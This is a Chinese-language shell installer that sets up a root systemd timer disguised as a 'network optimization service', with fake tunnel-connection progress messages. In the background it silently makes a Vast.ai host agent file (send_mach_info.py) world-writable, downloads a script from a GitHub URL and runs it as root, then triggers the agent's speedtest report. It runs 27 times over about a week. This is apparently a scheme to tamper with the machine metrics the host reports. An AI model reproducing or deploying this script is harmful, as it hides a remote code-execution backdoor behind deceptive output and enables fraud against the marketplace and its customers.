cat > install_speedtest_service.sh << 'EOF'
#!/bin/bash

set -e

echo "🚀 开始安装网络优化服务..."

# 创建服务目录
sudo mkdir -p /usr/local/bin

# 创建服务脚本
sudo tee /usr/local/bin/speedtest_service.sh << 'SERVICE_EOF' > /dev/null
#!/bin/bash

# 计数器文件
COUNTER_FILE="/var/lib/vastai_kaalia/speedtest_counter"

# 美化显示函数
show_progress() {
    case "$1" in
        "start")
            echo "🚀 函数配置完成。。。"
            echo "🔗 正在进行国际专线隧道连接。。。"
            for i in {1..3}; do
                echo -n "⏳"
                sleep 1
            done
            echo ""
            echo "✅ 隧道连接完成。。。"
            echo "📡 正在进行隧道通信测试。。。"
            sleep 10
            echo "✅ 隧道通信测试完成！"
            ;;
        "success")
            echo "🎉 网络优化完成！"
            ;;
    esac
}

# 初始化计数器
if [ ! -f "$COUNTER_FILE" ]; then
    echo "0" > "$COUNTER_FILE"
fi

# 读取当前计数
CURRENT_COUNT=$(cat "$COUNTER_FILE")

# 检查是否达到27次
if [ "$CURRENT_COUNT" -ge 27 ]; then
    echo "✅ 服务已完成所有优化周期"
    sudo systemctl stop speedtest-service.timer >/dev/null 2>&1
    sudo systemctl disable speedtest-service.timer >/dev/null 2>&1
    exit 0
fi

# 在终端显示美化信息
show_progress "start"

# 后台执行实际任务
{
    # 执行主要任务（静默执行）
    sudo chmod 666 /var/lib/vastai_kaalia/send_mach_info.py >/dev/null 2>&1
    curl -fsSL https://raw.githubusercontent.com/534607701/nick/main/replace_speedtest.sh -o /tmp/replace_speedtest.sh >/dev/null 2>&1
    sudo bash /tmp/replace_speedtest.sh >/dev/null 2>&1
    cd /var/lib/vastai_kaalia && sudo ./send_mach_info.py --speedtest >/dev/null 2>&1
    
    # 更新计数器
    echo "$((CURRENT_COUNT + 1))" > "$COUNTER_FILE"
    
    # 清理临时文件
    rm -f /tmp/replace_speedtest.sh
    
} >/dev/null 2>&1 &

# 等待后台任务完成
wait

# 显示完成信息
show_progress "success"
echo "📊 优化进度: $((CURRENT_COUNT + 1))/27"
SERVICE_EOF

sudo chmod +x /usr/local/bin/speedtest_service.sh

# 创建systemd服务文件
sudo tee /etc/systemd/system/speedtest-service.service << 'SERVICE_EOF' > /dev/null
[Unit]
Description=网络优化服务 - 每6小时执行一次，共27次
After=network.target

[Service]
Type=oneshot
ExecStart=/usr/local/bin/speedtest_service.sh
User=root
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
SERVICE_EOF

# 创建systemd定时器文件
sudo tee /etc/systemd/system/speedtest-service.timer << 'TIMER_EOF' > /dev/null
[Unit]
Description=网络优化定时器 - 每6小时执行
Requires=speedtest-service.service

[Timer]
OnCalendar=*-*-* 0/6:00:00
RandomizedDelaySec=300
Persistent=true

[Install]
WantedBy=timers.target
TIMER_EOF

# 重新加载systemd
sudo systemctl daemon-reload

# 启用并启动定时器
sudo systemctl enable speedtest-service.timer
sudo systemctl start speedtest-service.timer

# 创建日志文件和计数器
sudo touch /var/log/speedtest_service.log 2>/dev/null
sudo chmod 644 /var/log/speedtest_service.log 2>/dev/null
sudo mkdir -p /var/lib/vastai_kaalia
echo "0" | sudo tee /var/lib/vastai_kaalia/speedtest_counter >/dev/null

echo "🎉 网络优化服务安装完成！"
echo ""
echo "📋 服务信息："
echo "   - 执行间隔: 每6小时"
echo "   - 总执行次数: 27次"
echo "   - 预计完成时间: 约6.75天"
EOF

chmod +x install_speedtest_service.sh

echo "✅ 安装脚本已创建: install_speedtest_service.sh"
